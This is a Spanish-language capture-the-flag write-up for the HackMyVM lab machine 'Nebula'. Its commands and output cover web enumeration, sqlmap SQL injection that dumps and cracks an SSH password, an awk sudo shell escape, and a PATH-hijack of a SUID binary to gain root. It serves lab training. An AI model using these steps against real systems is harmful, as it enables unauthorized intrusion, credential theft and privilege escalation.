---
layout: post
title: Nebula
date: 2024-02-16
author: BlackCage
categories: [HackMyVM]
tags: [HMV, Enumeration, Fuzzing, SQLI, Path Hijacking, SUID]
---

# Nebula [ Hack My VM ]
![light mode only](/assets/img/imgs/nebula/logo.jpg){: .light }
![dark mode only](/assets/img/imgs/nebula/logo_black.png){: .dark }

# Reconocimiento
### NMAP
```
# Nmap 7.93 scan initiated Fri Feb 16 10:00:25 2024 as: nmap -sCV -p22,80 -oN targeted 192.168.1.104
Nmap scan report for 192.168.1.104
Host is up (0.00056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 639c2e5791af1e2e25ba55fdba48a860 (RSA)
|   256 d005241da8990ed6d1e5c55b406ab9f9 (ECDSA)
|_  256 d84ab8869d666d7fa4cbd073a1f4b519 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Nebula Lexus Labs
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:5F:90:24 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 16 10:00:50 2024 -- 1 IP address (1 host up) scanned in 24.78 seconds
```

Vemos que el puerto `22` está abierto, pero no tenemos credenciales válidas por el momento.

### Inspección
Una vez entramos en la página no vemos nada interesante. Es una empresa dedicada a la investigación y en los avances tecnológicos en general:

![Page](/assets/img/imgs/nebula/page.png)

Vemos que hay un panel para iniciar sesión, pero por desgracia no hay nada. Vamos a probar con **`GoBuster`**, una herramienta que nos permite hacer **`Fuzzing`** de manera rápida y sencilla, veamos qué podemos encontrar:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Nebula]
└─# gobuster dir -u "http://192.168.1.104/" -w /usr/share/wordlists/external/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x html,php,txt -b 404,503
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.104/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/external/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404,503
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2024/02/16 10:45:58 Starting gobuster in directory enumeration mode
===============================================================
[...]
/joinus               (Status: 301) [Size: 315] [--> http://192.168.1.104/joinus/]
```

Vemos un directorio que antes no habíamos visto, veamos de qué se trata:

![JoinUs](/assets/img/imgs/nebula/joinus.png)

Vemos que es la página que utilizan para reclutar a gente en caso de necesitar empleados. Vemos unas instrucciones y un link que nos lleva a un **`PDF`**. Vamos a verlo:

![JoinUsPDF](/assets/img/imgs/nebula/joinuspdf.png)

Vemos que nos dice que, en caso de ser aceptados, recibiremos un e-mail con un link. En este se incluirá el usuario y la contraseña para acceder a la reunión. Como podemos observar, se nos proporciona un ejemplo. Vamos a probar a utilizar estas credenciales para poder acceder:

![LoginAdmin](/assets/img/imgs/nebula/loginAdmin.png)

¡Wow! Al parecer funcionan y nos han dejado acceder al panel admin. Veamos a dónde nos lleva el botón **`Search Centrals`**:

![SearchCentrals](/assets/img/imgs/nebula/searchcentrals.png)

Nos lleva a un apartado donde podemos introducir un número y nos devuelve un resultado. Esto me suena un poco, tenemos una tabla y un **`input`**, tratemos de encontrar una inyección **`SQL`** (**`SQLI`**).

# Movimiento Lateral
### Shell
Tratemos de intentar averiguar si existe la vulnerabilidad antes mencionada. Para ello utilizaré **`SQLMap`**, una herramienta que nos permite automatizar el proceso de identificación y explotación de dicha vulnerabilidad:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Nebula]
└─# sqlmap -u "http://192.168.1.104/login/search_central.php?id=1" --cookie="PHPSESSID=01mft9ck71b3g868ki6ahjv0dg" --dbs --batch --random-agent
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:00:07 /2024-02-16/

[...]

[*] information_schema
[*] nebuladb

[...]
```

¡Pues sí, era vulnerable! Tenemos una base de datos llamada **`NebulaDB`**, vamos a ver las tablas que contiene:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Nebula]
└─# sqlmap -u "http://192.168.1.104/login/search_central.php?id=1" --cookie="PHPSESSID=01mft9ck71b3g868ki6ahjv0dg" -D "nebuladb" --tables --batch --random-agent
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:02:47 /2024-02-16/

[...]

+----------+
| central  |
| centrals |
| users    |
+----------+

[...]
```

Como vemos hay tres tablas: **`Central`**, **`Centrals`** y **`Users`**. Me interesa bastante la tabla de usuarios, aunque por desgracia no hay nada útil. Veamos la tabla **`Centrals`**:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Nebula]
└─# sqlmap -u "http://192.168.1.104/login/search_central.php?id=1" --cookie="PHPSESSID=01mft9ck71b3g868ki6ahjv0dg" -D "nebuladb" -T "centrals" --dump --batch --random-agent
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:06:11 /2024-02-16/

[...]

+----+--------------------+------------+--------------------+----------------------------------------------+
| id | role               | userssh    | username           | passwordssh                                  |
+----+--------------------+------------+--------------------+----------------------------------------------+
| 1  | Security           | pmccentral | Security Agency    | c8c605999f3d8352d7bb792cf3fdb25b (999999999) |
| 2  | Scientific Central | NULL       | Scientific Central | 40928bc415ab50954a2582018402...              |
+----+--------------------+------------+--------------------+----------------------------------------------+

[...]
```

Vemos que una de las columnas se llama **`UserSSH`**, por lo que automáticamente debería llamarnos la atención. Otra cosa muy importante es que **`SQLMap`** ha conseguido la contraseña del usuario **`pmccentral`** mediante un ataque de diccionario, por lo que tenemos su usuario y su contraseña (`pmccentral`:`999999999`).

Tratemos de iniciar sesión mediante **`SSH`**:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Nebula]
└─# ssh pmccentral@192.168.1.104
pmccentral@192.168.1.104's password: 999999999
pmccentral@laboratoryuser:~$
```

¡Qué bien! Ya estamos dentro de la máquina como el usuario **`pmccentral`**.

### Subida de privilegios #1
Hemos avanzado considerablemente hacia la obtención del **`control total`** sobre la máquina, aunque debemos proceder con cautela y mantener la compostura, ya que aún enfrentamos obstáculos adicionales.

Para iniciar, procederé a ejecutar el comando `sudo -l` con el fin de revisar los privilegios disponibles en la máquina:

```shell
pmccentral@laboratoryuser:~$ sudo -l
[sudo] password for pmccentral: 999999999
Matching Defaults entries for pmccentral on laboratoryuser:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pmccentral may run the following commands on laboratoryuser:
    (laboratoryadmin) /usr/bin/awk
pmccentral@laboratoryuser:~$
```

Observamos que se nos concede la capacidad de ejecutar el binario **`AWK`** con los privilegios del usuario **`laboratoryadmin`**. Para obtener una **`Shell`** interactiva, he empleado la funcionalidad de [**`GTFObins`**](https://gtfobins.github.io/gtfobins/awk/#sudo), un recurso valioso para identificar posibles exploits en binarios como **`AWK`**:

```shell
pmccentral@laboratoryuser:~$ sudo -u laboratoryadmin awk 'BEGIN {system("/bin/bash")}'
laboratoryadmin@laboratoryuser:/home/pmccentral$
```

¡Excelente! Estamos como el usuario **`laboratoryadmin`**. Ahora sí podemos seguir e intentar conseguir el **`control total`** de la máquina.

### Subida de privilegios #2
Este paso será bastante sencillo y es que tras una rápida insepcción al directorio base del usuario **`laboratoryadmin`** veo un directorio que me llama la atención llamado **`autoScripts`**. Veamos lo que hay dentro:

```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ ls -la
total 32
drwxr-xr-x 2 laboratoryadmin laboratoryadmin  4096 Dec 18 20:16 .
drwx------ 8 laboratoryadmin laboratoryadmin  4096 Dec 18 16:15 ..
-rwxrwxr-x 1 laboratoryadmin laboratoryadmin     8 Dec 18 20:16 head
-rwsr-xr-x 1 root            root            16792 Dec 17 15:40 PMCEmployees
laboratoryadmin@laboratoryuser:~/autoScripts$
```

Dentro de este directorio podemos ver dos archivos: **`head`** y **`PMCEmployees`**. El archivo **`PMCEmployees`** llama la atención por ser un binario configurado con el atributo **`SUID`**, propiedad del usuario **`root`**, lo que permite su ejecución con privilegios elevados sin necesidad de ser el usuario **`root`**.

Para obtener una visión superficial de su contenido se puede utilizar la herramienta **`strings`** para extraer secuencias de caracteres legibles del archivo binario:

```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ strings PMCEmployees
[...]

Showing top 10 best employees of PMC company
head /home/pmccentral/documents/employees.txt

[...]
```

Como podemos observar, está invocando de forma relativa la herramienta **`head`** para obtener los diez primeros resultados del fichero **`employees.txt`**.

Si miramos el otro fichero dentro de la carpeta **`autoScripts`**, llamado también **`head`**, vemos lo siguiente:

```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ cat head
bash -p
laboratoryadmin@laboratoryuser:~/autoScripts$
```

Este comando nos permite iniciar una nueva instancia de la **`Shell`** **`Bash`** con los permisos efectivos del usuario. Si conseguimos iniciar el programa **`head`** (como **`root`**) podemos obtener una **`Shell`** y convertirnos en **`root`**.

Para llevar a cabo esta acción se modificó la variable de entorno **`PATH`** para incluir la ruta actual (**`/home/laboratoryadmin/autoScripts`{: .filepath }**), asegurando que al ejecutar el binario **`PMCEmployees`**, este buscará relativamente el archivo **`head`** modificado.

Esto hará que se ejecute el fichero **`head`** modificado, concluyendo en la ejecución del comando **`bash -p`** como el usuario **`root`**:

```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ export PATH=$(pwd):$PATH
laboratoryadmin@laboratoryuser:~/autoScripts$ echo $PATH
/home/laboratoryadmin/autoScripts:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
laboratoryadmin@laboratoryuser:~/autoScripts$
```

Ahora ya estamos preparados para ejecutar el binario **`PMCEmployees`** y obtener una **`Shell`** como **`root`**:

```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees
root@laboratoryuser:~/autoScripts#
```

¡Genial! Ya tenemos el **`control total`** de la máquina. ¡Qué fácil!
